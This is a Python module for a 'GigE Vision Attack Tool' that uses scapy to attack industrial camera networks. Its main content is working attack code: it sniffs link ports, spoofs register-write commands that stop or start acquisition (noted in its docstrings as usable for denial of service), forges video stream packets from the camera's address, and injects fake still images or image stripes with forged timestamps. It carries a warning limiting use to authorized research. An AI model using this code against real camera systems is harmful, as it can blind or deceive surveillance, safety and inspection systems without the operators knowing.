"""
GigE Vision Attack Tool

This module provides a tool for performing various attacks on GigE Vision camera systems.
It allows for packet manipulation, fake frame injection, and other potentially disruptive
operations on GigE Vision communication.

WARNING: This tool is intended for authorized testing and research purposes only.
Unauthorized use of this tool may be illegal and unethical.

Classes:
    GigEVisionAttackTool: Main class for executing GigE Vision attacks.

Note: This module requires the gige_constants, gige_utils, and gige_packets modules.
Use with caution and only on systems you have explicit permission to test.
"""

import cv2
from gige.gige_constants import (
    DEFAULT_BLOCK_ID,
    GVCP_EXCLUDED_PORTS,
    MAX_HEIGHT,
    MAX_WIDTH,
    GigERegisters,
    GvcpCommands,
    Layers,
    Ports,
)
from gige.gige_packets import GvcpCmd, Gvsp, GvspLeader, GvspTrailer
from gige.utils import bgr_img_to_packets_payload
from utils.detection_utils import Rectangle
from utils.injection import get_stripe, insert_stripe_to_img


import cv2
import numpy as np
from scapy.all import PcapWriter, Raw, rdpcap, sendp, sniff
from scapy.fields import Callable, List, Optional, time
from scapy.layers.inet import IP, UDP, Ether
from scapy.packet import Packet
from scapy.plist import PacketList


import logging
import random
import time
from pathlib import Path
from typing import Callable, List, Optional


class GigEVisionAttackTool:
    """
    A class to perform various attacks on GigE Vision camera systems.

    This class provides methods for initializing a connection with a GigE Vision camera,
    sending malicious commands, injecting fake frames, and manipulating image data.
    It's designed to test the security and robustness of GigE Vision implementations.

    WARNING: Use of this tool without proper authorization may be illegal and unethical.

    Attributes:
        interface (str): Network interface name.
        cp_ip (str): Control Point IP address.
        camera_ip (str): Camera IP address.
        cp_mac (str): Control Point MAC address.
        camera_mac (str): Camera MAC address.
        img_width (int): Image width in pixels.
        img_height (int): Image height in pixels.
        max_payload_bytes (int): Maximum payload size in bytes.
        gvsp_dst_port (int): GVSP destination port.
        gvcp_src_port (int): GVCP source port.
        last_block_id (int): Last processed block ID.
        logger (Optional[logging.Logger]): Logger object for logging messages.
        last_timestamp (int): Last received timestamp.
        last_timestamp_block_id (Optional[int]): Block ID of the last timestamp.
    """

    def __init__(
        self,
        interface: str,
        cp_ip: str,
        camera_ip: str,
        cp_mac: str,
        camera_mac: str,
        max_payload_bytes: int,
        img_width: int = MAX_WIDTH,
        img_height: int = MAX_HEIGHT,
        logger: Optional[logging.Logger] = None,
    ):
        """
        Initialize the GigEVisionAttackTool.

        Args:
            interface (str): Network interface name.
            cp_ip (str): Controller IP address.
            camera_ip (str): Camera IP address.
            cp_mac (str): Controller MAC address.
            camera_mac (str): Camera MAC address.
            max_payload_bytes (int): Maximum payload size in bytes
            img_width (int): Image width in pixels
            img_height (int): Image height in pixels
            logger (Optional[logging.Logger]): Logger object.
        """
        self.interface = interface
        self.cp_ip = cp_ip
        self.camera_ip = camera_ip
        self.cp_mac = cp_mac
        self.camera_mac = camera_mac
        self.img_width = img_width
        self.img_height = img_height
        self.max_payload_bytes = max_payload_bytes

        self.gvsp_dst_port = -1
        self.gvcp_src_port = -1
        self.last_block_id = DEFAULT_BLOCK_ID - 1
        self.logger = logger
        self.last_timestamp = 1
        self.last_timestamp_block_id = None

    def set_gvsp_dst_port(self, gvsp_dst_port: int) -> None:
        """Set the GVSP destination port."""
        self.gvsp_dst_port = gvsp_dst_port

    def set_gvcp_src_port(self, gvcp_src_port: int) -> None:
        """Set the GVCP source port."""
        self.gvcp_src_port = gvcp_src_port

    def log_link(self):
        """Log the current link configuration."""
        msg = "GVCP:\n"
        msg += f"\tCP {self.cp_ip}({self.gvcp_src_port}) ---> Camera {self.camera_ip}({Ports.GVCP_DST.value})\n"
        msg += "GVSP:\n"
        msg += f"\tCamera {self.camera_ip}({Ports.GVSP_SRC.value}) ---> CP {self.cp_ip}({self.gvsp_dst_port})"
        self.log(msg, log_level=logging.DEBUG)

    def _get_writereg_cmd(
        self,
        address: int,
        value: int,
        request_id: Optional[int] = None,
        ack_required: bool = False,
    ) -> Packet:
        """
        Generate a potentially malicious WRITEREG command packet.

        Args:
            address (int): Register address to write to.
            value (int): Value to write to the register.
            request_id (int): Request identification number, if None selected randomly.
            ack_required (bool): Whether an acknowledgement is required.

        Returns:
            Packet: The generated WRITEREG command packet.
        """
        flags = 0x01 if ack_required else 0x00
        if request_id is None:
            request_id = random.randint(a=1, b=0xFFFF)
        cmd = (
            Ether(src=self.cp_mac, dst=self.camera_mac)
            / IP(src=self.cp_ip, dst=self.camera_ip)
            / UDP(sport=self.gvcp_src_port, dport=Ports.GVCP_DST.value)
            / GvcpCmd(
                Command=GvcpCommands.WRITEREG_CMD.name,
                Flags=flags,
                RegisterAddress=address,
                value=value,
                RequestID=request_id,
            )
        )
        return cmd

    def _get_acquisition_cmd(self, reg_val: int, ack_required: bool = False) -> Packet:
        """Generate an acquisition command packet."""
        return self._get_writereg_cmd(
            address=GigERegisters.ACQUISITION.value,
            value=reg_val,
            ack_required=ack_required,
        )

    def send_set_height_command(self, height: int) -> None:
        """
        Send a command to set the image height.

        Args:
            height (int): The height to set.
        """
        cmd = self._get_writereg_cmd(
            address=GigERegisters.HEIGHT.value, value=height, ack_required=True
        )
        sendp(cmd, iface=self.interface, count=1, verbose=False)

    def send_set_width_command(self, width: int) -> None:
        """
        Send a command to set the image width.

        Args:
            width (int): The height to set.
        """
        cmd = self._get_writereg_cmd(
            address=GigERegisters.WIDTH.value, value=width, ack_required=True
        )
        sendp(cmd, iface=self.interface, count=1, verbose=False)

    def send_stop_command(self, count: int = 1, ack_required: bool = False) -> None:
        """Send a command to stop acquisition (can be used for DoS)."""
        cmd = self._get_aquisition_cmd(reg_val=0, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)

    def send_start_command(self, count: int = 1, ack_required: bool = False) -> None:
        """Send a command to start acquisition (can be used for DoS)."""
        cmd = self._get_aquisition_cmd(reg_val=1, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)

    def sniff_link_parameters(self) -> None:
        """
        Sniff the network to determine link parameters.

        This method sniffs network traffic to find the GVSP destination port
        and GVCP source port used in the GigE Vision communication.
        """

        def pkt_callback(pkt):
            gvsp_port_found = self.gvsp_dst_port != -1
            gvcp_port_found = self.gvcp_src_port != -1

            if (
                not gvsp_port_found
                and pkt.haslayer(Layers.GVSP.value)
                and pkt[Layers.IP.value].src == self.camera_ip
            ):
                gvsp_dst_port = pkt[Layers.UDP.value].dport
                self.set_gvsp_dst_port(gvsp_dst_port)
                self.log(f"Found GVSP port {gvsp_dst_port}", log_level=logging.DEBUG)
            elif (
                not gvcp_port_found
                and pkt.haslayer(Layers.GVCP.value)
                and pkt[Layers.GVCP.value].Command == GvcpCommands.READREG_CMD.value
                and pkt[Layers.GVCP.value].RegisterAddress == GigERegisters.CCP
            ):
                if pkt[Layers.UDP.value].sport not in GVCP_EXCLUDED_PORTS:
                    gvcp_src_port = pkt[Layers.UDP.value].sport
                    self.set_gvcp_src_port(gvcp_src_port)
                    self.log(
                        f"Found GVCP port {gvcp_src_port}", log_level=logging.DEBUG
                    )

        def stop_filter(pkt):
            return self.gvsp_dst_port != -1 and self.gvcp_src_port != -1

        # sniff for ports
        self.log("Sniffing port numbers", log_level=logging.DEBUG)
        sniff(
            iface=self.interface,
            prn=pkt_callback,
            filter="udp",
            stop_filter=stop_filter,
            store=0,
        )
        self.log_link()

    def sniffing_for_trailer_filter(self, pkt: Packet) -> bool:
        """Filter function to detect GVSP trailer packets."""
        if pkt.haslayer(Layers.GVSP.value):
            if pkt[Layers.GVSP.value].Format == "TRAILER":
                return True
        return False

    def callback_update_block_id(self, pkt: Packet) -> bool:
        """Callback function to update block ID and timestamp."""
        if (
            pkt.haslayer(Layers.GVSP_LEADER.value)
            and pkt[Layers.IP.value].src == self.camera_ip
        ):
            self.last_timestamp = pkt[Layers.GVSP_LEADER.value].Timestamp
            self.last_timestamp_block_id = pkt[Layers.GVSP.value].BlockID
        if (
            pkt.haslayer(Layers.GVSP.value)
            and pkt[Layers.IP.value].src == self.camera_ip
        ):
            self.last_block_id = pkt[Layers.GVSP.value].BlockID
            self.log(
                f"Found GVSP packet for block {pkt[Layers.GVSP.value].BlockID} and packet {pkt[Layers.GVSP.value].PacketID}",
                log_level=logging.DEBUG,
            )
            return True
        return False

    def send_gvsp_pcap(self, gvsp_pcap_path: Path, fps: float = 1) -> None:
        self.log("Reading PCAP file")
        gvsp_packets = rdpcap(gvsp_pcap_path.as_posix())
        for packet in gvsp_packets:
            packet["UDP"].dport = self.gvsp_dst_port

        # split packet to frmaes
        frames = []
        frame_packets = []
        current_frame_id = None
        offset = 0
        while offset < len(gvsp_packets):
            # split leaders
            leader_found = False
            while offset < len(gvsp_packets) and not leader_found:
                packet = gvsp_packets[offset]
                if packet.haslayer(Layers.GVSP_LEADER.value):
                    if current_frame_id is None:
                        leader_found = True
                    elif packet.BlockID != current_frame_id:
                        leader_found = True
                if not leader_found:
                    frame_packets.append(packet)
                    offset += 1

            if leader_found:
                if len(frame_packets) > 0:
                    frames.append(frame_packets)
                frame_packets = [packet]
                current_frame_id = packet.BlockID
                offset += 1

        frame_duration = 1 / fps
        self.log(f"Sending pcap frames at rate {fps}", log_level=logging.DEBUG)
        for frame in frames:
            start_time = time.time()
            sendp(frame, iface=self.interface, verbose=False)
            sendp_duration = time.time() - start_time
            time.sleep(max(0, frame_duration - sendp_duration))

    def stop_and_replace_with_pcap(
        self, frame_pcap_path: str, timeout: float = 2
    ) -> None:
        """
        Stop the current acquisition and replace it with packets from a PCAP file.

        Args:
            frame_pcap_path (str): Path to the PCAP file containing replacement frames.
            timeout (float): Timeout for sniffing the TRAILER packet.
        """
        self.log("Stopping acquisition", log_level=logging.DEBUG)
        self.send_stop_command(count=1)
        self.log(
            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
            log_level=logging.DEBUG,
        )
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Injecting", log_level=logging.DEBUG)
        gvsp_packets = rdpcap(frame_pcap_path)
        for packet in gvsp_packets:
            packet[Layers.UDP.value].dport = self.gvsp_dst_port
            packet["IP"].src = self.camera_ip
            packet["IP"].dst = self.cp_ip
        sendp(gvsp_packets, iface=self.interface, verbose=False)
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID

    def stop_and_replace_with_image(self, img_path: str, timeout: float = 2) -> None:
        """
        Stop the current acquisition and replace it with a single image.

        Args:
            img_path (str): Path to the image file to inject.
            timeout (float): Timeout for sniffing the TRAILER packet.
        """
        self.log("Stopping acquisition", log_level=logging.DEBUG)
        self.send_stop_command(count=1)
        self.log(
            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
            log_level=logging.DEBUG,
        )
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Injecting", log_level=logging.DEBUG)
        gvsp_packets = self.img_to_gvsp(img_path, block_id=self.last_block_id + 1)
        sendp(gvsp_packets, iface=self.interface, verbose=False)
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID

    def img_to_gvsp_using_ref(
        self, img_path: str, reference_gvsp_pacp: str
    ) -> PacketList:
        """
        Convert an image to GVSP packets using a reference PCAP file.

        Args:
            img_path (str): Path to the image file.
            reference_gvsp_pacp (str): Path to the reference GVSP PCAP file.

        Returns:
            PacketList: List of GVSP packets containing the image data.
        """
        payload = self.get_gvsp_payload_packets(img_path)
        gvsp_packets = self.insert_payload_to_gvsp_pcap(payload, reference_gvsp_pacp)
        return gvsp_packets

    def insert_payload_to_gvsp_pcap(
        self,
        payload: List[bytes],
        reference_gvsp_pacp: str,
        block_id: int = DEFAULT_BLOCK_ID,
    ) -> PacketList:
        """
        Insert a payload into GVSP packets from a reference PCAP file.

        Args:
            payload (List[bytes]): Payload to insert into the packets.
            reference_gvsp_pacp (str): Path to the reference GVSP PCAP file.
            block_id (int): Block ID to use for the new packets.

        Returns:
            PacketList: List of GVSP packets with the inserted payload.
        """
        gvsp_packets = rdpcap(reference_gvsp_pacp)
        for pkt, pkt_payload in zip(gvsp_packets[1:-1], payload):
            pkt[Layers.GVSP.value].load = pkt_payload
        for pkt in gvsp_packets:
            pkt[Layers.UDP.value].src = Ports.GVSP_SRC.value
            pkt[Layers.UDP.value].dst = self.gvsp_dst_port
            pkt[Layers.IP.value].src = self.camera_ip
            pkt[Layers.IP.value].dst = self.cp_ip
            pkt[Layers.GVSP.value].BlockID = block_id
        return gvsp_packets

    def get_gvsp_payload_packets(self, img_path: str) -> PacketList:
        """
        Get GVSP payload packets from an image file.

        Args:
            img_path (str): Path to the image file.

        Returns:
            PacketList: List of GVSP payload packets.
        """
        img_bgr = cv2.imread(img_path)
        img_bgr = cv2.resize(img_bgr, (self.img_width, self.img_height))
        payload = bgr_img_to_packets_payload(img_bgr, self.max_payload_bytes)
        return payload

    def img_to_gvsp(
        self,
        img_path: str,
        save_pcap_debug: bool = False,
        block_id: int = DEFAULT_BLOCK_ID,
    ) -> PacketList:
        """
        Convert an image to GVSP packets.

        Args:
            img_path (str): Path to the image file.
            save_pcap_debug (bool): Whether to save debug PCAP file.
            block_id (int): Block ID to use for the packets.

        Returns:
            PacketList: List of GVSP packets containing the image data.
        """
        gvsp_packets = []

        packet_id = 0
        leader_packet = (
            Ether(dst=self.cp_mac, src=self.camera_mac)
            / IP(src=self.camera_ip, dst=self.cp_ip)
            / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
            / Gvsp(BlockID=block_id, Format="LEADER", PacketID=packet_id)
            / GvspLeader(SizeX=self.img_width, SizeY=self.img_height)
        )
        gvsp_packets.append(leader_packet)
        packet_id += 1

        payload = self.get_gvsp_payload_packets(img_path=img_path)
        for pkt_payload in payload:
            next_pkt = (
                Ether(dst=self.cp_mac, src=self.camera_mac)
                / IP(src=self.camera_ip, dst=self.cp_ip)
                / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
                / Gvsp(BlockID=block_id, Format="PAYLOAD", PacketID=packet_id)
                / Raw(bytes(pkt_payload))
            )
            gvsp_packets.append(next_pkt)
            packet_id += 1

        trailer_packet = (
            Ether(dst=self.cp_mac, src=self.camera_mac)
            / IP(src=self.camera_ip, dst=self.cp_ip)
            / UDP(sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0)
            / Gvsp(BlockID=block_id, Format="TRAILER", PacketID=packet_id)
            / GvspTrailer(SizeY=self.img_height)
        )
        gvsp_packets.append(trailer_packet)
        packet_id += 1

        gvsp_packets = PacketList(gvsp_packets)

        if save_pcap_debug:
            pktdump = PcapWriter(
                "debugging_cfrafted_gvsp.pcap", append=False, sync=True
            )
            for pkt in gvsp_packets:
                pktdump.write(pkt)
            pktdump.close()

        return gvsp_packets

    def sniff_block_id(
        self, stop_filter: Optional[Callable[[Packet], bool]] = None
    ) -> None:
        """
        Sniff packets to update the block ID.

        Args:
            stop_filter (Optional[Callable[[Packet], bool]]): Function to determine when to stop sniffing.
        """
        self.log("Sniffing for blockID", log_level=logging.DEBUG)
        if stop_filter is None:
            stop_filter = self.callback_update_block_id
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=stop_filter,
            store=0,
            timeout=1,
        )
        self.log(
            f"Last Sniffed BLockID = {self.last_block_id}", log_level=logging.DEBUG
        )

    def inject_gvsp_packets(
        self, gvsp_packets: PacketList, block_id: int, count: int = 1
    ) -> None:
        """
        Inject GVSP packets into the network.

        Args:
            gvsp_packets (PacketList): List of GVSP packets to inject.
            block_id (int): Block ID to use for the injected packets.
            count (int): Number of times to inject the packets.
        """
        for pkt in gvsp_packets:
            pkt[Layers.GVSP.value].BlockID = block_id
        sendp(
            gvsp_packets,
            iface=self.interface,
            verbose=False,
            realtime=False,
            count=count,
        )

    def get_stripe_gvsp_packets(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        block_id: int,
        target_row: int = 0,
    ) -> PacketList:
        """
        Get GVSP packets for a stripe of an image.

        Args:
            img_path (str): Path to the image file.
            first_row (int): First row of the stripe.
            num_rows (int): Number of rows in the stripe.
            block_id (int): Block ID to use for the packets.
            target_row (int): Target row for inserting the stripe.

        Returns:
            PacketList: List of GVSP packets containing the stripe data.
        """
        img_bgr = cv2.imread(img_path)
        img_bgr = cv2.resize(img_bgr, (self.img_width, self.img_height))

        stripe = get_stripe(
            img_bgr, Rectangle((0, first_row), (self.img_width, first_row + num_rows))
        )
        background_img = np.zeros_like(img_bgr)
        injection_img = insert_stripe_to_img(background_img, stripe, target_row)

        payload = bgr_img_to_packets_payload(injection_img, self.max_payload_bytes)
        stripe_packets = []
        for pkt_id, pkt_payload in enumerate(payload):
            if (pkt_payload != 0).any():
                next_pkt = (
                    Ether(dst=self.cp_mac, src=self.camera_mac)
                    / IP(src=self.camera_ip, dst=self.cp_ip)
                    / UDP(
                        sport=Ports.GVSP_SRC.value, dport=self.gvsp_dst_port, chksum=0
                    )
                    / Gvsp(BlockID=block_id, Format="PAYLOAD", PacketID=pkt_id + 1)
                    / Raw(bytes(pkt_payload))
                )
                stripe_packets.append(next_pkt)
        return stripe_packets

    def inject_stripe(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        future_id_diff: int = 10,
        count: int = 1,
    ) -> int:
        """
        Inject a stripe from an image into the GVSP stream.

        Args:
            img_path (str): Path to the image file.
            first_row (int): First row of the stripe to inject.
            num_rows (int): Number of rows in the stripe.
            future_id_diff (int): Difference in block ID for future injection.
            count (int): Number of times to inject the stripe.

        Returns:
            int: The injected block ID.
        """
        stripe_packets = self.get_stripe_gvsp_packets(
            img_path, first_row, num_rows, block_id=0
        )
        self.sniff_block_id()
        injected_id = self.last_block_id + future_id_diff
        self.inject_gvsp_packets(stripe_packets, block_id=injected_id, count=count)
        return injected_id

    def inject_stripe_consecutive_frames(
        self,
        img_path: str,
        first_row: int,
        num_rows: int,
        fps: float,
        injection_duration: float,
        future_id_diff: int = 10,
        count: int = 1,
    ) -> None:
        """
        Inject a stripe from an image into consecutive frames of the GVSP stream.

        Args:
            img_path (str): Path to the image file.
            first_row (int): First row of the stripe to inject.
            num_rows (int): Number of rows in the stripe.
            fps (float): Frames per second of the stream.
            injection_duration (float): Duration of the injection in seconds.
            future_id_diff (int): Difference in block ID for future injection.
            count (int): Number of times to inject the stripe in each frame.
        """
        stripe_packets = self.get_stripe_gvsp_packets(
            img_path, first_row, num_rows, block_id=0
        )
        num_injections = int(np.ceil(fps * injection_duration))
        if num_injections == 0:
            self.log(
                "NO INJECTIONS: duration less than injection time",
                log_level=logging.WARNING,
            )
            return

        frame_duration = 1 / fps
        self.sniff_block_id()
        first_injected_id = self.last_block_id + future_id_diff
        waiting_time = 0.9 * frame_duration
        time.sleep(waiting_time)
        self.log(
            f"Attempting stripe injection for frames {first_injected_id} - {first_injected_id + num_injections - 1}",
            log_level=logging.DEBUG,
        )
        for injection_ind in range(num_injections):
            start_time = time.time()
            self.log(
                f"Injecting stripe to {first_injected_id + injection_ind}",
                log_level=logging.DEBUG,
            )
            self.inject_gvsp_packets(
                stripe_packets, block_id=first_injected_id + injection_ind, count=count
            )
            end_time = time.time()
            self.log(
                f"Insertion took {end_time - start_time} seconds",
                log_level=logging.DEBUG,
            )
            time.sleep(max(0, waiting_time - (end_time - start_time)))
        self.log(f"Stripe Attack Finished", log_level=logging.DEBUG)

    def fake_still_image(
        self,
        img_path: str,
        duration: float,
        injection_effective_frame_rate: float,
        fps: float,
    ) -> None:
        """
        Inject a fake still image into the GVSP stream for a specified duration.

        Args:
            img_path (str): Path to the image file to inject.
            duration (float): Duration of the injection in seconds.
            injection_effective_frame_rate (float): Effective frame rate for the injection.
            fps (Optional[float]): Frames per second of the original stream.
        """
        timeout = 1  # seconds
        self.sniff_block_id()
        self.log("BlockID found", log_level=logging.DEBUG)
        self.log(
            f"Stopping acquisition for {duration} seconds with still image",
            log_level=logging.DEBUG,
        )
        self.send_stop_command(count=1)
        self.log(
            f"Sniffing until TRAILER is sent, timeout {timeout} seconds",
            log_level=logging.DEBUG,
        )
        sniff(
            iface=self.interface,
            filter="udp",
            prn=self.callback_update_block_id,
            stop_filter=self.sniffing_for_trailer_filter,
            store=0,
            timeout=timeout,
        )
        self.log("Full Frame Injection Started", log_level=logging.DEBUG)
        num_frames = round(duration * min(injection_effective_frame_rate, fps))
        self.log(f"Number of fake frames = {num_frames}", log_level=logging.DEBUG)
        self.log(f"Last GVSP BlockID = {self.last_block_id}", log_level=logging.DEBUG)
        gvsp_fake_packets = self.img_to_gvsp(img_path, block_id=DEFAULT_BLOCK_ID)
        injection_started = time.time()
        iterations_time = []
        for _ in range(num_frames):
            itertation_started = time.time()
            for pkt in gvsp_fake_packets:
                pkt[Layers.GVSP.value].BlockID = self.last_block_id + 1
            if self.last_timestamp_block_id is not None:
                time_elapsed_of_last_recorded_timestamp = (
                    (self.last_block_id + 1 - self.last_timestamp_block_id) * 1 / fps
                )
                gvsp_fake_packets[0][Layers.GVSP_LEADER.value].Timestamp = int(
                    self.last_timestamp
                    + time_elapsed_of_last_recorded_timestamp * 1_000_000_000
                )
            sendp(gvsp_fake_packets, iface=self.interface, verbose=False)
            self.last_block_id += 1
            iteration_ended = time.time()
            iteration_duration = iteration_ended - itertation_started
            iterations_time.append(iteration_duration)
            time.sleep(max(0, 1 / fps - iteration_duration))

        injection_finished = time.time()
        self.log("Full Frame Injection Ended", log_level=logging.DEBUG)
        self.log(
            f"Injected for {injection_finished-injection_started} seconds",
            log_level=logging.DEBUG,
        )
        self.log(
            f"average iteration time = {np.average(np.array(iterations_time))}",
            log_level=logging.DEBUG,
        )

        self.log("Restarting acquisition", log_level=logging.DEBUG)
        self.send_start_command(count=1)

    def log(self, msg: str, log_level: int = logging.INFO) -> None:
        """
        Log a message using the provided logger or print to console.

        Args:
            msg (str): The message to log.
            log_level (int): The logging level to use.
        """
        if self.logger is None:
            print(msg)
            return
        if log_level == logging.DEBUG:
            self.logger.debug(msg)
        elif log_level == logging.INFO:
            self.logger.info(msg)
        elif log_level == logging.WARNING:
            self.logger.warning(msg)
        elif log_level == logging.ERROR:
            self.logger.error(msg)
        elif log_level == logging.CRITICAL:
            self.logger.critical(msg)
        else:
            raise ValueError(f"Invalid log level: {log_level}")
